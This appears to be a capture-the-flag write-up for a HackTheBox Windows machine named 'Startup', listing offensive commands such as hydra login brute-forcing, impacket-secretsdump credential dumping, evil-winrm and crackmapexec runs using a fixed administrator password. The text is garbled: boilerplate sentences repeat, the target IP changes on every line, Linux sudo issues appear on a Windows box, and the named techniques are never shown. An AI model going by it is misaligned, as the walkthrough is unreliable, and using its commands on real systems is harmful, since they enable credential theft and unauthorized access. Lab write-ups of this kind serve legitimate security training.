---
TitleSEO: "HackTheBox — Startup (Insane Windows) | ZureFX"
TitlePost: "HackTheBox — Startup (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Startup. IDOR and Resource-Based Constrained Delegation to achieve insane compromise on Windows."
Keywords: "windows, insane, linux, web, active directory"
URL: "https://zurefx.github.io/writeups/htb-startup-786.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-startup-786/"
Date: "2025-09-09"
Tags: "Windows, Insane, Linux, Web, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-startup-786"
Permalink: "/writeups/htb-startup-786.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Startup** is rated **Insane** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.57.29.38`.

### Objectives

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.52.22.150 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.87.160.126 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.14.46 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.40.184.176/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.63.82.13/FUZZ
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

### Web Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **Resource-Based Constrained Delegation**.

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.107.242.160 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.225.68
crackmapexec smb 10.25.81.120 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
evil-winrm -i 10.81.53.169 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.33.56.109 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.114.155.155
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.83.231 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.107.57
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.14.203
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.226.229
```

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

## Summary

### Tools Used

- `hashcat`
- `rubeus`
- `netcat`
- `nikto`

### Key Takeaways

- IDOR
- Resource-Based Constrained Delegation
